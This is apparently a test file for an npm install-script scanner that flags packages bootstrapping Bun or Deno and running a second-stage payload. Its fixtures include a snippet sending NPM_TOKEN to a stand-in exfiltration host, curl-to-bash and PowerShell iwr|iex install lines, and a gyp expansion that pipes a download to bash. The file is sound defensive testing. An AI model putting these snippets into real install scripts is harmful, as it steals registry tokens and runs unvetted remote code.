'use strict';
const { test, before, after } = require('node:test');
const assert = require('node:assert');
const path = require('node:path');
const { spawn } = require('node:child_process');
const { analyzePackage, runtimeBootstrapFindings, runtimeInvocation, splitShell } = require('../src/analyzer');
const { buildReport, buildSarif } = require('../src/reporter');
const { start } = require('../scripts/serve-bootstrap-fixtures');

const ROOT = path.join(__dirname, '..');
const CLI = path.join(ROOT, 'src', 'cli.js');
const FIX = (d) => path.join('fixtures', 'bootstrap', d);

// A package built inline for the unit-level analyzer assertions.
const pkg = (scripts, files = {}) => ({ name: 'x', version: '1.0.0', scripts, files: new Map(Object.entries(files)) });
const first = (p) => analyzePackage(p)[0];

let mock;
before(async () => { mock = await start(); });
after(() => mock.server.close());

// Run the CLI against a fixture through the mock registry (no --offline, the
// exact acceptance shape). Returns { status, stdout, stderr }.
function run(args) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [CLI, ...args], {
      cwd: ROOT, timeout: 60000,
      env: { ...process.env, NPM_SCRIPT_LENS_REGISTRY: mock.url, NPM_SCRIPT_LENS_CACHE_DIR: path.join(require('node:os').tmpdir(), `lens-boot-${process.pid}-${args.join('_').replace(/[^a-z0-9]/gi, '')}`) },
    });
    let stdout = '', stderr = '';
    child.stdout.on('data', (d) => { stdout += d; });
    child.stderr.on('data', (d) => { stderr += d; });
    child.on('exit', (status) => resolve({ status, stdout, stderr }));
  });
}
const parse = (s) => JSON.parse(s.replace(/^﻿/, ''));

// --- analyzer units --------------------------------------------------------

test('runtime table: node, bun, deno run, tsx, ts-node, npx/bunx forms resolve a file', () => {
  const files = new Map();
  const runtimes = ['node', 'nodejs', 'bun', 'tsx', 'ts-node'];
  for (const rt of runtimes) {
    const inv = runtimeInvocation(`${rt} ./go.js`, splitShell(`${rt} ./go.js`)[0].trim().split(/\s+/));
    assert.strictEqual(inv && inv.kind, 'file', rt);
    assert.strictEqual(inv.file, './go.js', rt);
  }
  const deno = runtimeInvocation('deno run -A ./go.ts', 'deno run -A ./go.ts'.split(/\s+/));
  assert.deepStrictEqual([deno.runtime, deno.kind, deno.file], ['deno', 'file', './go.ts']);
  const npx = runtimeInvocation('npx tsx ./go.ts', 'npx tsx ./go.ts'.split(/\s+/));
  assert.deepStrictEqual([npx.runtime, npx.kind, npx.wrapper], ['tsx', 'file', 'npx']);
  const bunx = runtimeInvocation('bun x tsx go.ts', 'bun x tsx go.ts'.split(/\s+/));
  assert.deepStrictEqual([bunx.runtime, bunx.kind, bunx.wrapper], ['tsx', 'file', 'bunx']);
  assert.strictEqual(runtimeInvocation('eslint .', ['eslint', '.']), null);
});

test('a bun/tsx/deno entry file is walked, its capabilities merged', () => {
  for (const cmd of ['bun entry.js', 'tsx entry.js', 'deno run -A entry.ts']) {
    const files = { 'entry.js': "require('https').get('https://x.dev/t');", 'entry.ts': "fetch('https://x.dev/t');" };
    const row = first(pkg({ preinstall: cmd }, files));
    assert.strictEqual(row.risk, 'MEDIUM', cmd);
    assert.ok(row.signals.some((s) => s.startsWith('net:')), `${cmd}: ${row.signals}`);
  }
});

test('ChainDrop shape: one bootstrap finding, stage2 net+env merged and attributed', () => {
  const setup = "await fetch('https://github.com/oven-sh/bun/releases/download/x/bun-linux-x64-baseline.zip');\n"
    + "require('child_process').spawnSync(bin, ['./stage2.js']);";
  const stage2 = "const t = process.env.NPM_TOKEN; fetch('https://exfil.invalid', { body: t });";
  const row = first(pkg({ preinstall: 'node setup.mjs' }, { 'setup.mjs': setup, 'stage2.js': stage2 }));
  assert.strictEqual(row.risk, 'HIGH');
  const finds = runtimeBootstrapFindings([row]);
  assert.strictEqual(finds.length, 1);
  assert.strictEqual(finds[0].runtime, 'bun');
  assert.match(finds[0].detail, /oven-sh\/bun releases/);
  assert.match(finds[0].detail, /runs stage2\.js/);
  assert.ok(row.signals.includes('net: fetch()'), JSON.stringify(row.signals));
  assert.ok(row.signals.includes('env: process.env'), JSON.stringify(row.signals));
});

test('shell shape: curl | bash bun install then a bundled payload is one bootstrap, not a bare exec', () => {
  const payload = "const t = process.env.NPM_TOKEN; fetch('https://exfil.invalid', { body: t });";
  const cmd = 'curl -fsSL https://bun.sh/install | bash && ~/.bun/bin/bun ./scripts/setup.js';
  const row = first(pkg({ preinstall: cmd }, { 'scripts/setup.js': payload }));
  assert.strictEqual(row.risk, 'HIGH');
  const finds = runtimeBootstrapFindings([row]);
  assert.strictEqual(finds.length, 1);
  assert.match(finds[0].detail, /bun\.sh\/install/);
  assert.match(finds[0].detail, /runs scripts\/setup\.js/);
  assert.ok(row.signals.includes('net: fetch()'));
  assert.ok(row.signals.includes('env: process.env'));
});

test('every distribution source in the RUNTIME_DIST table is recognised', () => {
  const cases = [
    ['node x.js', 'bun-linux-x64-musl-baseline.zip pulled', 'bun'],
    ['node x.js', 'bun-darwin-aarch64.zip', 'bun'],
    ['node x.js', 'bun-windows-x64-baseline.zip', 'bun'],
    ['node x.js', 'deno.land/install.sh', 'deno'],
    ['node x.js', 'https://dl.deno.land/release', 'deno'],
  ];
  for (const [cmd, url, rt] of cases) {
    const row = first(pkg({ preinstall: cmd }, { 'x.js': `fetch('https://host.invalid/${url}');` }));
    const finds = runtimeBootstrapFindings([row]);
    assert.ok(finds.some((f) => f.runtime === rt), `${url}: ${JSON.stringify(finds)}`);
  }
});

test('npm i -g bun|deno is a bootstrap; powershell iwr|iex counts', () => {
  assert.ok(runtimeBootstrapFindings([first(pkg({ preinstall: 'npm i -g bun && bun go.js' }, { 'go.js': 'fetch("https://x");' }))])
    .some((f) => f.runtime === 'bun'));
  assert.ok(runtimeBootstrapFindings([first(pkg({ preinstall: 'yarn global add deno' }))]).some((f) => f.runtime === 'deno'));
  assert.ok(runtimeBootstrapFindings([first(pkg({ preinstall: 'powershell -c "iwr https://bun.sh/install | iex"' }))])
    .some((f) => f.runtime === 'bun'));
});

test('using an installed runtime is not a bootstrap; installing one is', () => {
  const benign = first(pkg({ postinstall: 'bun run build', build: 'bun ./b.js' }, { 'b.js': "console.log('x')" }));
  assert.strictEqual(benign.risk, 'SAFE');
  assert.strictEqual(runtimeBootstrapFindings([benign]).length, 0);
  const benignBunFile = first(pkg({ postinstall: 'bun ./b.js' }, { 'b.js': "console.log('x')" }));
  assert.strictEqual(runtimeBootstrapFindings([benignBunFile]).length, 0);
});

test('an unresolved alternate-runtime entry degrades to generic HIGH, no crash, no bootstrap', () => {
  const row = first(pkg({ preinstall: 'bun ./missing.js' }, {}));
  assert.strictEqual(row.risk, 'HIGH');
  assert.ok(row.signals.some((s) => s.includes('(source not in tarball)')));
  assert.strictEqual(runtimeBootstrapFindings([row]).length, 0);
});

test('a cross-runtime cycle (node -> bun -> node) terminates', () => {
  const row = first(pkg({ preinstall: 'node a.js' }, {
    'a.js': "require('child_process').spawn('bun', ['./b.js']);",
    'b.js': "require('child_process').spawn('node', ['./a.js']); fetch('https://c.invalid');",
  }));
  assert.strictEqual(row.risk, 'HIGH');
  assert.ok(row.signals.includes('net: fetch()'), JSON.stringify(row.signals));
});

test('a gyp command expansion that fetches a runtime is a bootstrap', () => {
  const gyp = JSON.stringify({ targets: [{ target_name: 'x', type: 'none',
    sources: ["<!(curl -fsSL https://bun.sh/install | bash)"] }] });
  // implicit node-gyp build (a root binding.gyp, no install script of its own):
  // fetchPackage synthesizes scripts.install = 'node-gyp rebuild'.
  const p = { name: 'g', version: '1.0.0', scripts: { install: 'node-gyp rebuild' }, files: new Map([['binding.gyp', gyp]]) };
  const row = analyzePackage(p)[0];
  assert.ok(runtimeBootstrapFindings([row]).some((f) => f.runtime === 'bun'), JSON.stringify(row.signals));
});

// --- reporter / SARIF / JSON shapes ---------------------------------------

test('buildReport renders a Runtime bootstrap section naming the runtime and merged caps', () => {
  const row = first(pkg({ preinstall: 'node setup.mjs' }, {
    'setup.mjs': "await fetch('https://github.com/oven-sh/bun/releases/x/bun-linux-x64-baseline.zip'); require('child_process').spawnSync(b,['./s.js']);",
    's.js': "const t = process.env.NPM_TOKEN; fetch('https://exfil.invalid', { body: t });",
  }));
  const md = buildReport([{ name: 'chaindrop-demo', version: '2.0.1', rows: [row] }]);
  assert.match(md, /## 🔴 Runtime bootstrap \(1\)/);
  assert.match(md, /RUNTIME_BOOTSTRAP.*bun/);
  assert.match(md, /net: fetch\(\)/);
});

test('SARIF carries a runtime-bootstrap rule and an error-level result', () => {
  const row = first(pkg({ preinstall: 'node setup.mjs' }, {
    'setup.mjs': "await fetch('https://github.com/oven-sh/bun/releases/x/bun-darwin-x64.zip'); require('child_process').spawn(b,['./s.js']);",
    's.js': "fetch('https://exfil.invalid');",
  }));
  const sarif = buildSarif([{ name: 'chaindrop-demo', version: '2.0.1', rows: [row] }], { lockPath: 'package-lock.json', lockText: '' });
  assert.ok(sarif.runs[0].tool.driver.rules.some((r) => r.id === 'runtime-bootstrap'));
  const result = sarif.runs[0].results.find((r) => r.ruleId === 'runtime-bootstrap');
  assert.ok(result, 'a runtime-bootstrap result exists');
  assert.strictEqual(result.level, 'error');
  assert.match(result.message.text, /bun/);
});

// --- CLI e2e through the mock registry (the acceptance commands) -----------

test('acceptance: audit --json on the ChainDrop fixture has RUNTIME_BOOTSTRAP + merged caps', async () => {
  const out = await run(['audit', '--json', '--path', FIX('chaindrop-shape'), '--no-trust']);
  assert.strictEqual(out.status, 0, out.stderr);
  const j = parse(out.stdout);
  const r = j.results.find((x) => x.name === 'chaindrop-demo');
  assert.strictEqual(r.risk, 'HIGH');
  assert.ok(r.runtimeBootstrap && r.runtimeBootstrap[0].runtime === 'bun', JSON.stringify(r.runtimeBootstrap));
  const sigs = r.rows.flatMap((row) => row.signals);
  assert.ok(sigs.includes('net: fetch()') && sigs.includes('env: process.env'), JSON.stringify(sigs));
});

test('acceptance: audit --json on the bun shell fixture has RUNTIME_BOOTSTRAP + merged caps', async () => {
  const out = await run(['audit', '--json', '--path', FIX('bun-bootstrap'), '--no-trust']);
  assert.strictEqual(out.status, 0, out.stderr);
  const r = parse(out.stdout).results.find((x) => x.name === 'bun-curl-demo');
  assert.ok(r.runtimeBootstrap && r.runtimeBootstrap[0].runtime === 'bun');
  const sigs = r.rows.flatMap((row) => row.signals);
  assert.ok(sigs.includes('net: fetch()') && sigs.includes('env: process.env'), JSON.stringify(sigs));
});

test('acceptance: --fail-on-runtime-bootstrap exits 1 on a bootstrap fixture, 0 on the benign bun fixture', async () => {
  const bad = await run(['audit', '--path', FIX('chaindrop-shape'), '--no-trust', '--fail-on-runtime-bootstrap']);
  assert.strictEqual(bad.status, 1, bad.stderr);
  assert.match(bad.stderr, /RUNTIME_BOOTSTRAP/);
  const good = await run(['audit', '--path', FIX('benign-bun'), '--no-trust', '--fail-on-runtime-bootstrap']);
  assert.strictEqual(good.status, 0, good.stderr);
});

test('the benign bun fixture is clean: no bootstrap, and --fail-on-high passes', async () => {
  const out = await run(['audit', '--json', '--path', FIX('benign-bun'), '--no-trust']);
  const r = parse(out.stdout).results.find((x) => x.name === 'benign-bun-demo');
  assert.strictEqual(r.risk, 'SAFE');
  assert.ok(!r.runtimeBootstrap);
});

test('the deno fixture follows the .ts entry point and merges its network capability', async () => {
  const out = await run(['audit', '--json', '--path', FIX('deno-bootstrap'), '--no-trust']);
  const r = parse(out.stdout).results.find((x) => x.name === 'deno-run-demo');
  assert.ok(r.rows.flatMap((row) => row.signals).includes('net: fetch()'), JSON.stringify(r.rows));
});

test('the unresolved bun fixture is generic HIGH, never a crash', async () => {
  const out = await run(['audit', '--json', '--path', FIX('unresolved-bun'), '--no-trust']);
  assert.strictEqual(out.status, 0, out.stderr);
  const r = parse(out.stdout).results.find((x) => x.name === 'unresolved-bun-demo');
  assert.strictEqual(r.risk, 'HIGH');
  assert.ok(!r.runtimeBootstrap);
});

test('policy runtimeBootstrapPolicy: "fail" arms the gate; invalid value is refused', async () => {
  const os = require('node:os'); const fs = require('node:fs');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lens-pol-'));
  fs.copyFileSync(path.join(ROOT, FIX('chaindrop-shape'), 'package-lock.json'), path.join(dir, 'package-lock.json'));
  fs.writeFileSync(path.join(dir, 'script-lens.policy.json'), JSON.stringify({ runtimeBootstrapPolicy: 'fail' }));
  const armed = await run(['audit', '--path', dir, '--no-trust']);
  assert.strictEqual(armed.status, 1, armed.stderr);
  fs.writeFileSync(path.join(dir, 'script-lens.policy.json'), JSON.stringify({ runtimeBootstrapPolicy: 'nope' }));
  const bad = await run(['audit', '--path', dir, '--no-trust']);
  assert.strictEqual(bad.status, 2, bad.stderr);
  assert.match(bad.stderr, /runtimeBootstrapPolicy/);
});

test('acceptance: --diff prints the gained runtime bootstrap line for a patch bump', async () => {
  const out = await run(['audit', '--path', FIX('patched-release'),
    '--diff', path.join(ROOT, FIX('patched-release'), 'base-lock.json'), '--no-trust']);
  assert.strictEqual(out.status, 0, out.stderr);
  assert.match(out.stdout, /gained vs 1\.0\.0: runtime bootstrap \(bun\)/);
});
